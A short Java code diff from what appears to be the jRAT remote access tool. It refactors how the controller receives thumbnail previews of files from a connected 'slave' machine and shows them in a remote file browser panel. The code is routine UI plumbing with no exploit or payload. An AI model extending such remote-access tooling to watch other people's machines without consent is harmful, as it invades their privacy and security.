@@ -6,15 +6,12 @@ import java.io.DataInputStream;
 
 import se.jrat.common.utils.ImageUtils;
 import se.jrat.controller.Slave;
-import se.jrat.controller.ui.frames.FrameRemoteThumbView;
-
+import se.jrat.controller.ui.frames.FrameRemoteFiles;
 
 public class Packet59ThumbnailPreview extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		FrameRemoteThumbView frame = FrameRemoteThumbView.INSTANCES.get(slave);
-
 		String path = slave.readLine();
 		int imageSize = dis.readInt();
 
@@ -28,11 +25,13 @@ public class Packet59ThumbnailPreview extends AbstractIncomingPacket {
 		byte[] buffer = new byte[imageSize];
 		slave.getDataInputStream().readFully(buffer);
 
+		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
+
 		if (frame != null) {
 			BufferedImage img = ImageUtils.decodeImage(buffer);
 			imageGraphics.drawImage(img, 0, 0, w, h, null);
-			frame.addImage(path, image);
-			frame.setProgress(frame.getProgress() + 1);
+			frame.getThumbPanel().addImage(path, image);
+			frame.getThumbPanel().setProgress(frame.getThumbPanel().getProgress() + 1);
 		}
 	}
 
